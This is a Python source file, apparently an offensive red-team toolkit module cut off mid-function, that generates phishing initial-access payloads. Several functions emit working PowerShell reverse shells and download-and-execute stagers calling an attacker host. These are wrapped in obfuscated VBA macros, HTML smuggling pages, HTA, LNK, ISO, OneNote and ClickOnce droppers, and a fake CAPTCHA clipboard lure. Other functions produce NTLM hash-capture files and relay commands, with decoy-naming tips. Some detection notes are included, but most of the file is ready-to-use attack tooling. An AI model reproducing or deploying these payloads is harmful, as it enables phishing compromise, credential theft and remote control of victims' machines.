"""
Initial access technique generator — VBA macros, HTML smuggling, HTA droppers, LNK shortcuts.
For use in authorized red team exercises only.
"""
import base64
from dataclasses import dataclass, field

SUPPORTED_TECHNIQUES = (
    "vba_macro",
    "html_smuggling",
    "hta_dropper",
    "lnk_shortcut",
    "iso_container",
    "onenote_dropper",
    "clickonce_manifest",
    # v4.5 — modern initial access (2024-2025 threat actor TTPs)
    "clickfix",
    "search_ms_webdav",
    "url_ntlm_capture",
    "xll_addin",
    "svg_phishing",
    "chm_dropper",
    "teams_phishing",
    "msix_installer",
)


@dataclass
class InitialAccessResult:
    payload: str
    technique: str
    delivery_hint: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


# ── Variants ──────────────────────────────────────────────────────────────────

def _vba_macro(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);$r+='PS '+(pwd).Path+'> ';"
        f"$x=[text.encoding]::ASCII.GetBytes($r);$s.Write($x,0,$x.Length);$s.Flush()}};"
        f"$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()

    if obfuscate:
        # Split the encoded command across string variables to evade static sigs
        mid = len(b64_cmd) // 2
        part1, part2 = b64_cmd[:mid], b64_cmd[mid:]
        macro = (
            "Sub AutoOpen()\n"
            "    Dim oShell As Object\n"
            "    Set oShell = CreateObject(\"WScript.Shell\")\n"
            f"    Dim p1 As String\n"
            f"    Dim p2 As String\n"
            f"    p1 = \"{part1}\"\n"
            f"    p2 = \"{part2}\"\n"
            "    Dim cmd As String\n"
            "    cmd = \"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand \" & p1 & p2\n"
            "    oShell.Run cmd, 0, False\n"
            "End Sub\n\n"
            "Sub Document_Open()\n"
            "    AutoOpen\n"
            "End Sub"
        )
    else:
        macro = (
            "Sub AutoOpen()\n"
            "    Dim oShell As Object\n"
            "    Set oShell = CreateObject(\"WScript.Shell\")\n"
            f"    oShell.Run \"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}\", 0, False\n"
            "End Sub\n\n"
            "Sub Document_Open()\n"
            "    AutoOpen\n"
            "End Sub"
        )
    return InitialAccessResult(
        payload=macro,
        technique="vba_macro",
        delivery_hint=(
            "Embed in Word/Excel macro-enabled document (.docm/.xlsm). "
            "Requires user to enable macros (or use older Office without Protected View). "
            "Save as .doc (older format) to include macros without .docm extension."
        ),
        notes=f"PowerShell reverse shell to {lhost}:{lport}. Both AutoOpen and Document_Open trigger macros.",
        techniques=["T1566.001", "T1059.001"],
        risk="HIGH",
        detections=[
            "Office spawning powershell.exe child process (high-fidelity)",
            "AMSI: PowerShell encoded command with socket connection",
            "WScript.Shell CreateObject from winword.exe/excel.exe (Sysmon Event 1)",
        ],
    )


def _html_smuggling(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    # The payload to smuggle — in a real engagement this would be an implant binary
    # Here we generate a VBScript dropper as the smuggled file content
    vbs_content = (
        f'Set oShell = CreateObject("WScript.Shell")\n'
        f'oShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -C '
        f'$c=New-Object System.Net.Sockets.TCPClient(\\"{lhost}\\",{lport});'
        f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
        f'while(($i=$s.Read($b,0,$b.Length))-ne 0)'
        f'{{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        f'(iex $d 2>&1|Out-String)+\'PS >\'|%{{[text.encoding]::ASCII.GetBytes($_)}}|'
        f'%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"'
        f', 0, False\n'
    )
    if obfuscate:
        # Encode the VBS payload bytes as a JS array for smuggling
        vbs_bytes = list(vbs_content.encode())
        js_array = ",".join(str(b) for b in vbs_bytes)
        file_name = "Invoice_2024.vbs"
    else:
        vbs_bytes = list(vbs_content.encode())
        js_array = ",".join(str(b) for b in vbs_bytes)
        file_name = "payload.vbs"

    html = f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<p>Please wait while your document loads...</p>
<script>
(function() {{
  // Blob-based file delivery — payload never touches disk as a URL fetch
  var bytes = new Uint8Array([{js_array}]);
  var blob = new Blob([bytes], {{type: 'application/octet-stream'}});
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = '{file_name}';
  document.body.appendChild(a);
  a.click();
  setTimeout(function() {{ URL.revokeObjectURL(url); }}, 1000);
}})();
</script>
</body>
</html>"""

    return InitialAccessResult(
        payload=html,
        technique="html_smuggling",
        delivery_hint=(
            "Send HTML page via email link or attachment. "
            "Browser auto-downloads the embedded blob — no network request to attacker server. "
            "User must run the downloaded .vbs file."
        ),
        notes=(
            f"Smuggles VBScript dropper connecting back to {lhost}:{lport}. "
            "Replace the embedded payload with a real implant binary for operational use."
        ),
        techniques=["T1566.002", "T1027.006"],
        risk="HIGH",
        detections=[
            "JavaScript Blob download without corresponding network request (EDR behavioral)",
            "Browser downloading executable file type (.vbs/.exe) (browser telemetry)",
            "WScript.exe execution of dropped .vbs file",
        ],
    )


def _hta_dropper(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> '|%{{[text.encoding]::ASCII.GetBytes($_)}}|"
        f"%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()

    if obfuscate:
        # Use VBScript with string splitting and char obfuscation
        hta = f"""<html>
<head>
<title>Document</title>
<HTA:Application
    ID="oHTA"
    WindowState="minimize"
    ShowInTaskbar="No"
    Caption="No"
/>
</head>
<body>
<script language="VBScript">
Dim oShell
Set oShell = CreateObject("WS" & "cript.Sh" & "ell")
Dim p
p = "{b64_cmd}"
oShell.Run "pow" & "ershell -NoP -NonI -W Hid" & "den -Exec Byp" & "ass -EncodedCommand " & p, 0, False
Close
</script>
</body>
</html>"""
    else:
        hta = f"""<html>
<head><title>Loading</title>
<HTA:Application WindowState="minimize" ShowInTaskbar="No" Caption="No"/>
</head>
<body>
<script language="VBScript">
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}", 0, False
Close
</script>
</body>
</html>"""

    return InitialAccessResult(
        payload=hta,
        technique="hta_dropper",
        delivery_hint=(
            "Deliver .hta file via email link or attachment. "
            "Windows executes .hta with mshta.exe (bypasses script execution policy). "
            "Can also serve from web: mshta http://attacker/payload.hta"
        ),
        notes=(
            f"HTA executed by mshta.exe, spawning PowerShell reverse shell to {lhost}:{lport}. "
            "HTA runs with Medium integrity by default."
        ),
        techniques=["T1218.005", "T1059.001"],
        risk="HIGH",
        detections=[
            "mshta.exe spawning powershell.exe (high-fidelity Defender/Sysmon rule)",
            "HTA file execution from browser downloads or email client",
            "AMSI detection of PowerShell encoded payload inside mshta context",
        ],
    )


def _lnk_shortcut(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0)"
        f"{{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"iex $d 2>&1|Out-String|%{{[text.encoding]::ASCII.GetBytes($_)}}|"
        f"%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()

    powershell_cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}"

    # PowerShell script to create the LNK file programmatically
    lnk_creator = (
        f"$WS = New-Object -ComObject WScript.Shell\n"
        f"$LNK = $WS.CreateShortcut('C:\\\\Users\\\\Public\\\\Invoice.lnk')\n"
        f"$LNK.TargetPath = 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'\n"
        f"$LNK.Arguments = '-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}'\n"
        f"$LNK.IconLocation = 'C:\\\\Windows\\\\System32\\\\shell32.dll,70'  # PDF icon\n"
        f"$LNK.WindowStyle = 7  # Minimized\n"
        f"$LNK.Save()"
    )

    payload_text = (
        f"# PowerShell to generate the .lnk file (run on attacker or target):\n\n"
        f"{lnk_creator}\n\n"
        f"# --- Resulting LNK executes: ---\n"
        f"# {powershell_cmd}\n\n"
        f"# Delivery: embed in ZIP archive, ISO, or send as email attachment.\n"
        f"# ISO wrapping: LNK inside ISO bypasses Mark-of-the-Web (MotW) on older systems."
    )

    return InitialAccessResult(
        payload=payload_text,
        technique="lnk_shortcut",
        delivery_hint=(
            "Package .lnk in ZIP or ISO for email/phishing delivery. "
            "ISO trick bypasses MotW on Windows < 11 22H2. "
            "Use a PDF/Word icon (shell32.dll icon index) to disguise as document."
        ),
        notes=(
            f"LNK shortcut executes PowerShell reverse shell to {lhost}:{lport}. "
            "Configure icon to mimic expected document type for higher click rates."
        ),
        techniques=["T1566.001", "T1204.002", "T1059.001"],
        risk="HIGH",
        detections=[
            "powershell.exe launched from explorer.exe with encoded command (Sysmon Event 1)",
            "LNK file with TargetPath pointing to powershell.exe",
            "AMSI: PowerShell network connection in encoded payload",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

def _iso_container(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    Generate an ISO build script. ISO containers bypass Mark-of-the-Web (MotW) on
    Windows <11 22H2 because the loop-mounted contents are not tagged with the
    download zone. Common phishing chain: email .iso → user mounts → executes .lnk
    inside → spawns powershell payload.
    """
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> '|%{{[text.encoding]::ASCII.GetBytes($_)}}|"
        f"%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()
    pwsh_args = f"-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}"

    builder = (
        "#!/usr/bin/env bash\n"
        "# Builds an ISO container that bypasses MotW on legacy Windows.\n"
        "# Requires: genisoimage (or mkisofs). On macOS: hdiutil makehybrid.\n"
        "set -euo pipefail\n"
        "WORK=$(mktemp -d)\n"
        "mkdir -p \"$WORK/iso\"\n"
        "cat > \"$WORK/iso/Invoice.lnk.ps1\" <<'EOF'\n"
        "$WS = New-Object -ComObject WScript.Shell\n"
        "$LNK = $WS.CreateShortcut('Invoice.lnk')\n"
        "$LNK.TargetPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\n"
        f"$LNK.Arguments = '{pwsh_args}'\n"
        "$LNK.IconLocation = 'C:\\Windows\\System32\\shell32.dll,70'  # PDF\n"
        "$LNK.WindowStyle = 7\n"
        "$LNK.Save()\n"
        "EOF\n"
        "# Drop a decoy PDF beside the LNK for plausibility:\n"
        "echo 'Decoy PDF — open the Invoice shortcut.' > \"$WORK/iso/readme.txt\"\n"
        "powershell -Command - < \"$WORK/iso/Invoice.lnk.ps1\" || \\\n"
        "  echo '[!] Run the .ps1 on a Windows host to produce Invoice.lnk, then place beside readme.txt in the ISO root.'\n"
        "genisoimage -o invoice.iso -V 'Invoice' -J -r \"$WORK/iso\"\n"
        "echo '[+] invoice.iso ready — deliver via email or shared link.'\n"
    )
    return InitialAccessResult(
        payload=builder,
        technique="iso_container",
        delivery_hint=(
            "Deliver invoice.iso via email or file share. On Windows <11 22H2 the "
            "contents are not tagged with Mark-of-the-Web. User mounts → executes "
            "Invoice.lnk → PowerShell connects back to attacker. "
            "On modern Windows, ISO contents now inherit MotW — combine with a "
            "container that strips MotW or use ClickOnce instead."
        ),
        notes=(
            f"PowerShell reverse shell to {lhost}:{lport} embedded in LNK ArgumentList. "
            "The shipped script generates the LNK on a Windows host then packs the ISO."
        ),
        techniques=["T1566.001", "T1204.002", "T1027.006"],
        risk="HIGH",
        detections=[
            "Windows mounted ISO without corresponding browser download chain",
            "LNK execution from removable/virtual disk (Event 4663 + DeviceId)",
            "powershell.exe child of explorer.exe with EncodedCommand argument",
        ],
    )


def _onenote_dropper(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    OneNote .one droppers gained popularity after Microsoft disabled VBA macros
    by default. The .one file embeds a script (typically .hta / .vbs / .cmd /
    .ps1) that the victim must double-click. There is no MotW prompt for embedded
    files on older builds.

    We produce a build script that uses python's `oletools` / `pyOneNote` style
    layout. For maximum reliability operators usually build the .one in OneNote
    directly — the script below provides the embedded payload + a step-by-step
    procedure.
    """
    ps_payload = (
        f"powershell -NoP -NonI -W Hidden -Exec Bypass -C "
        f"\"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"(iex $d 2>&1|Out-String)+'PS> '|%{{[text.encoding]::ASCII.GetBytes($_)}}|"
        f"%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()\""
    )
    embedded_cmd = (
        "@echo off\n"
        "rem onenote_drop.cmd — runs when victim double-clicks embedded attachment\n"
        f"{ps_payload}\n"
    )

    instructions = (
        f"# OneNote .one dropper — workflow\n"
        f"#\n"
        f"# 1. Create a new OneNote section (.one) titled 'Q4 Invoice'.\n"
        f"# 2. Insert > File Attachment > select the embedded .cmd below (saved as\n"
        f"#    onenote_drop.cmd).\n"
        f"# 3. In OneNote, set the file display icon to a PDF or document glyph.\n"
        f"# 4. Add a decoy table above the attachment that visually obscures the\n"
        f"#    .cmd file extension (e.g. 'Please open the attached invoice.pdf').\n"
        f"# 5. Save as `Q4_Invoice.one` and deliver via email.\n"
        f"#\n"
        f"# When the victim double-clicks the embedded attachment, OneNote shows\n"
        f"# a single 'security' warning that is commonly clicked-through. The\n"
        f"# .cmd then spawns the PowerShell reverse shell.\n"
        f"#\n"
        f"# --- onenote_drop.cmd ---\n"
        f"{embedded_cmd}\n"
        f"# --- end ---\n"
        f"#\n"
        f"# Defender note: builds after 2023-04 block embedded executables in\n"
        f"# OneNote by default. Combine with a renamed .lnk inside a .zip if\n"
        f"# the target is on a modern build.\n"
    )

    return InitialAccessResult(
        payload=instructions,
        technique="onenote_dropper",
        delivery_hint=(
            "Send .one file via email attachment. Victim double-clicks embedded "
            "attachment → OneNote shows one prompt → user clicks Run → payload fires."
        ),
        notes=(
            f"PowerShell reverse shell to {lhost}:{lport}. Effective against orgs "
            "that disabled VBA macros but allow OneNote attachments."
        ),
        techniques=["T1566.001", "T1204.002"],
        risk="HIGH",
        detections=[
            "ONENOTE.EXE spawning cmd.exe/powershell.exe (Sysmon Event 1)",
            "OneNote process writing executable extensions to %TEMP%/OneNote",
            "Defender ASR rule 'Block all Office applications from creating child processes' includes OneNote since 2023-04",
        ],
    )


def _clickonce_manifest(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    ClickOnce applications launch via the `ms-appinstaller://` URI scheme on
    older builds, or via downloaded .application manifests. Many corporate
    Windows fleets allow ClickOnce execution because legitimate enterprise apps
    rely on it.
    """
    application_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd"
                manifestVersion="1.0"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:asmv1="urn:schemas-microsoft-com:asm.v1"
                xmlns:asmv2="urn:schemas-microsoft-com:asm.v2"
                xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS"
                xmlns="urn:schemas-microsoft-com:asm.v2"
                xmlns:dsig="http://www.w3.org/2000/09/xmldsig#"
                xmlns:co.v1="urn:schemas-microsoft-com:clickonce.v1"
                xmlns:co.v2="urn:schemas-microsoft-com:clickonce.v2">
  <asmv1:assemblyIdentity name="InvoicePortal.application"
                          version="1.0.0.0"
                          publicKeyToken="0000000000000000"
                          language="neutral"
                          processorArchitecture="msil"
                          xmlns="urn:schemas-microsoft-com:asm.v1" />
  <description asmv2:publisher="InvoiceCorp"
               asmv2:product="Invoice Portal"
               xmlns="urn:schemas-microsoft-com:asm.v1" />
  <deployment install="true" mapFileExtensions="true" trustURLParameters="true">
    <subscription>
      <update>
        <expiration maximumAge="0" unit="hours" />
      </update>
    </subscription>
    <deploymentProvider codebase="http://{lhost}:{lport}/InvoicePortal.application" />
  </deployment>
  <compatibleFrameworks xmlns="urn:schemas-microsoft-com:clickonce.v2">
    <framework targetVersion="4.0" profile="Full" supportedRuntime="4.0.30319" />
  </compatibleFrameworks>
  <dependency>
    <dependentAssembly dependencyType="install"
                       codebase="InvoicePortal.exe.manifest"
                       size="1024">
      <assemblyIdentity name="InvoicePortal.exe"
                        version="1.0.0.0"
                        publicKeyToken="0000000000000000"
                        language="neutral"
                        processorArchitecture="msil"
                        type="win32" />
    </dependentAssembly>
  </dependency>
</asmv1:assembly>
"""

    builder = (
        f"# ClickOnce dropper workflow\n"
        f"# 1. Build a .NET stager (InvoicePortal.exe) that connects back to {lhost}:{lport}.\n"
        f"#    Minimal example (csc.exe build):\n"
        f"#\n"
        f"#    using System;\n"
        f"#    using System.Net.Sockets;\n"
        f"#    using System.Diagnostics;\n"
        f"#    class P {{ static void Main() {{\n"
        f"#      var t = new TcpClient(\"{lhost}\", {lport});\n"
        f"#      var s = t.GetStream();\n"
        f"#      var p = new Process(); p.StartInfo.FileName = \"cmd.exe\";\n"
        f"#      p.StartInfo.UseShellExecute = false;\n"
        f"#      p.StartInfo.RedirectStandardInput = true;\n"
        f"#      p.StartInfo.RedirectStandardOutput = true; p.Start();\n"
        f"#      // bidirectional pipe loops here\n"
        f"#    }} }}\n"
        f"#\n"
        f"# 2. Generate the ClickOnce manifest tree via `mage.exe`:\n"
        f"#    mage -New Application -Processor msil -ToFile InvoicePortal.exe.manifest \\\n"
        f"#         -name 'InvoicePortal.exe' -Version 1.0.0.0 -FromDirectory .\n"
        f"#    mage -New Deployment -Processor msil -Install true -Publisher 'InvoiceCorp' \\\n"
        f"#         -ProviderUrl http://{lhost}:{lport}/InvoicePortal.application \\\n"
        f"#         -AppManifest InvoicePortal.exe.manifest -ToFile InvoicePortal.application\n"
        f"# 3. Host both InvoicePortal.application and InvoicePortal.exe at http://{lhost}:{lport}/\n"
        f"# 4. Deliver the .application URL via email; the Windows shell prompts the\n"
        f"#    victim with 'Open' (no admin required). One click → payload runs.\n"
        f"\n"
        f"# --- InvoicePortal.application (manifest below) ---\n"
        f"{application_xml}"
    )

    return InitialAccessResult(
        payload=builder,
        technique="clickonce_manifest",
        delivery_hint=(
            "Send a link to http://{lhost}:{lport}/InvoicePortal.application in an "
            "email phishing campaign. Most Windows builds allow ClickOnce execution "
            "for arbitrary publishers; the prompt does not warn about untrusted "
            "publishers, just 'Open / Cancel'."
        ).format(lhost=lhost, lport=lport),
        notes=(
            "Requires .NET Framework on target (default on Windows). "
            f"Stager is a .NET assembly that connects back to {lhost}:{lport}."
        ),
        techniques=["T1566.002", "T1218.013", "T1059.003"],
        risk="HIGH",
        detections=[
            "dfsvc.exe (ClickOnce Application Deployment Service) spawning cmd.exe / powershell.exe",
            "AppDeploy events in Microsoft-Windows-ApplicationExperience-LookupSvc/Operational",
            "ClickOnce install logs in %LOCALAPPDATA%\\Apps\\2.0\\Manifests",
        ],
    )


# ── v4.5 — modern initial access (2024-2025) ──────────────────────────────────

def _clickfix(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    ClickFix / FakeCAPTCHA — highest-volume initial access technique in 2025.
    Lure page writes a PowerShell one-liner to the clipboard; user executes it
    via Win+R → Ctrl+V → Enter without any file download or MOTW trigger.
    """
    ps_cmd = (
        "powershell -NoP -NonI -W Hidden -Exec Bypass -C "
        "\"IEX(New-Object Net.WebClient).DownloadString('http://" + lhost + ":" + str(lport) + "/s')\""
    )
    if obfuscate:
        import base64
        enc = base64.b64encode(
            ("IEX(New-Object Net.WebClient).DownloadString('http://" + lhost + ":" + str(lport) + "/s')").encode("utf-16-le")
        ).decode()
        ps_cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " + enc

    html = (
        "<!DOCTYPE html>\n"
        "<html><head><title>Verify you are human</title></head>\n"
        "<body style='font-family:Arial;max-width:480px;margin:80px auto;text-align:center'>\n"
        "  <h2>Verify you are human</h2>\n"
        "  <p>Complete the CAPTCHA verification below to continue.</p>\n"
        "  <div id='captcha' style='border:1px solid #ccc;padding:20px;margin:20px 0'>\n"
        "    <p><b>I am not a robot</b></p>\n"
        "    <button onclick='verify()' style='padding:10px 30px;font-size:16px'>Verify</button>\n"
        "  </div>\n"
        "  <div id='instructions' style='display:none;background:#f5f5f5;padding:15px;border-radius:4px'>\n"
        "    <p>To complete verification:</p>\n"
        "    <ol style='text-align:left'>\n"
        "      <li>Press <kbd>Win</kbd> + <kbd>R</kbd> to open Run</li>\n"
        "      <li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste</li>\n"
        "      <li>Press <kbd>Enter</kbd></li>\n"
        "    </ol>\n"
        "  </div>\n"
        "  <script>\n"
        "    function verify() {\n"
        "      navigator.clipboard.writeText('" + ps_cmd.replace("'", "\\'") + "');\n"
        "      document.getElementById('captcha').style.display='none';\n"
        "      document.getElementById('instructions').style.display='block';\n"
        "    }\n"
        "  </script>\n"
        "</body></html>"
    )
    return InitialAccessResult(
        payload=html,
        technique="clickfix",
        delivery_hint=(
            "Host on attacker HTTPS server. Deliver link via email/SMS/Teams message. "
            "No file download — payload executes via clipboard paste. "
            "Set up a Metasploit/Sliver HTTP listener on " + lhost + ":" + str(lport) + " "
            "serving a stager at /s. "
            "Variant: replace CAPTCHA with 'fix browser error' or 'Microsoft activation' lure."
        ),
        notes=(
            "Zero file artifacts before execution. Parent process is explorer.exe → powershell.exe "
            "which mimics legitimate user-launched PowerShell. MOTW does not apply. "
            "Highest real-world success rate in 2025; used by nation-state and cybercrime groups. "
            "Clipboard API requires HTTPS origin or user gesture — host lure on TLS endpoint. "
            "Rotate lure themes: fake CAPTCHA, Cloudflare turnstile, Office activation, Teams fix."
        ),
        techniques=["T1204.004 - User Execution: Malicious Copy-Paste",
                    "T1059.001 - Command and Scripting Interpreter: PowerShell",
                    "T1566.002 - Phishing: Spearphishing Link"],
        risk="CRITICAL",
        detections=[
            "explorer.exe → powershell.exe with -EncodedCommand or IEX/DownloadString in cmdline",
            "RunMRU registry key (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU) containing base64 or IEX",
            "Sysmon Event 1: powershell.exe with parent explorer.exe and suspicious arguments",
            "Browser clipboard write API call followed immediately by Run dialog (user-behavior analytics)",
            "Network: outbound HTTP/S from powershell.exe shortly after Run dialog execution",
        ],
    )


def _search_ms_webdav(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    search-ms:// + WebDAV delivery — bypasses MOTW by serving files from WebDAV.
    Explorer opens a fake 'search results' window populated from attacker WebDAV share.
    """
    share_path = "\\\\" + lhost + "@SSL@" + str(lport) + "\\DavWWWRoot"
    search_uri = (
        "search-ms:query=Invoice&crumb=location:"
        + share_path.replace("\\", "%5C").replace("@", "%40")
        + "&displayname=Search+Results"
    )

    html = (
        "<!DOCTYPE html>\n"
        "<html><head><title>Invoice Portal</title></head>\n"
        "<body>\n"
        "<!-- Trigger via anchor href or meta refresh -->\n"
        "<!-- Option A: anchor tag -->\n"
        "<a href='" + search_uri + "'>View Invoice</a>\n"
        "\n"
        "<!-- Option B: auto-trigger via meta refresh (opens search window on page load) -->\n"
        "<!-- <meta http-equiv='refresh' content='0;url=" + search_uri + "'> -->\n"
        "\n"
        "<!-- Option C: JavaScript redirect -->\n"
        "<script>\n"
        "  // Uncomment to auto-open on page visit:\n"
        "  // window.location = '" + search_uri + "';\n"
        "</script>\n"
        "</body></html>\n"
        "\n"
        "# ──── WebDAV server setup ────────────────────────────────────────────────\n"
        "# Serve malicious LNK/EXE from " + share_path + "\n"
        "#\n"
        "# Option 1 — Python wsgidav:\n"
        "#   pip install wsgidav cheroot\n"
        "#   wsgidav --host=0.0.0.0 --port=" + str(lport) + " --root=/srv/webdav --ssl --no-auth\n"
        "#\n"
        "# Option 2 — impacket smbserver (WebDAV fallback via HTTP):\n"
        "#   python3 smbserver.py DavWWWRoot /srv/webdav -smb2support\n"
        "#\n"
        "# Payload placed at: /srv/webdav/Invoice.lnk\n"
        "# Displayed name in Explorer: 'Invoice' (appears to be a local result)\n"
        "# Files from WebDAV share lack MOTW — double-click executes without SmartScreen\n"
    )
    return InitialAccessResult(
        payload=html,
        technique="search_ms_webdav",
        delivery_hint=(
            "Embed the search-ms:// URI in a phishing email (HTML body anchor), "
            "a malicious Office document hyperlink, or a web page. "
            "When clicked, Windows Explorer opens displaying attacker-controlled 'search results'. "
            "Files shown come from WebDAV share at " + lhost + ":" + str(lport) + " — no MOTW. "
            "Place a malicious LNK or EXE in the WebDAV root named to match the search query."
        ),
        notes=(
            "WebDAV-delivered files historically did not receive MOTW (CVE-2024-38213 copy2pwn). "
            "Microsoft patched but analysis shows incomplete remediation on many patch levels. "
            "The search-ms: URI is registered by Windows and cannot be blocked without breaking Search. "
            "Chain: email → search-ms link → Explorer opens results → victim clicks 'Invoice.lnk' → execution. "
            "WebDAV over HTTPS (:443) blends with normal web traffic. "
            "Disable WebClient service detection by using @SSL notation for HTTPS WebDAV."
        ),
        techniques=["T1566.002 - Phishing: Spearphishing Link",
                    "T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass",
                    "T1204.001 - User Execution: Malicious Link",
                    "T1135 - Network Share Discovery (abused for delivery)"],
        risk="HIGH",
        detections=[
            "explorer.exe with search-ms: command-line argument",
            "WebClient service (svchost hosting webclient) starting unexpectedly",
            "Outbound TCP 80/443/445 to non-corporate WebDAV server from explorer.exe",
            "Child process spawned from file path under \\\\server@SSL\\ (WebDAV mount)",
            "Sysmon Event 22 (DNS) for external domain resolved by WebClient service",
        ],
    )


def _url_ntlm_capture(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    .url file with UNC IconFile — forces NTLMv2 authentication on file open/folder view.
    Zero-click on unpatched targets; one-click (double-click to open) on patched ones.
    CVEs: CVE-2024-43451, CVE-2025-21377, CVE-2025-24054, CVE-2025-24071.
    """
    url_file = (
        "[InternetShortcut]\n"
        "URL=file:///" + lhost + "/share/invoice.pdf\n"
        "IconFile=\\\\" + lhost + "\\share\\icon.ico\n"
        "IconIndex=0\n"
        "HotKey=0\n"
        "IDList=\n"
    )

    library_ms = (
        "<?xml version='1.0' encoding='UTF-8'?>\n"
        "<libraryDescription xmlns='http://schemas.microsoft.com/windows/2009/library'>\n"
        "  <name>Documents</name>\n"
        "  <version>6</version>\n"
        "  <isLibraryPinned>true</isLibraryPinned>\n"
        "  <iconReference>imageres.dll,-1002</iconReference>\n"
        "  <templateInfo>\n"
        "    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>\n"
        "  </templateInfo>\n"
        "  <searchConnectorDescriptionList>\n"
        "    <searchConnectorDescription>\n"
        "      <isDefaultSaveLocation>true</isDefaultSaveLocation>\n"
        "      <isSupported>false</isSupported>\n"
        "      <simpleLocation>\n"
        "        <url>\\\\" + lhost + "\\share</url>\n"
        "      </simpleLocation>\n"
        "    </searchConnectorDescription>\n"
        "  </searchConnectorDescriptionList>\n"
        "</libraryDescription>"
    )

    combined = (
        "# ── Option A: .url file (save as Invoice.url) ──────────────────────────\n"
        + url_file
        + "\n"
        "# ── Option B: .library-ms file — CVE-2025-24071 (zero-click in ZIP) ───\n"
        "# Save as Documents.library-ms inside a ZIP. Extraction alone leaks NTLM.\n"
        + library_ms
        + "\n\n"
        "# ── Listener (Responder for capture, ntlmrelayx for relay) ────────────\n"
        "# Hash capture:\n"
        "#   sudo responder -I eth0 -wdv\n"
        "#   # Watch for NTLMv2 hash from victim; crack offline with hashcat -m 5600\n"
        "#\n"
        "# NTLM relay to LDAP (AD foothold — no crack needed):\n"
        "#   sudo python3 ntlmrelayx.py -t ldap://<DC_IP> -smb2support --escalate-user <user>\n"
        "#\n"
        "# NTLM relay to SMB (code execution — requires no SMB signing):\n"
        "#   sudo python3 ntlmrelayx.py -t smb://<TARGET_IP> -smb2support -c whoami\n"
        "#\n"
        "# Attacker SMB listener IP: " + lhost + "\n"
        "# Ensure TCP 445 or 80 inbound is accessible from target network\n"
    )
    return InitialAccessResult(
        payload=combined,
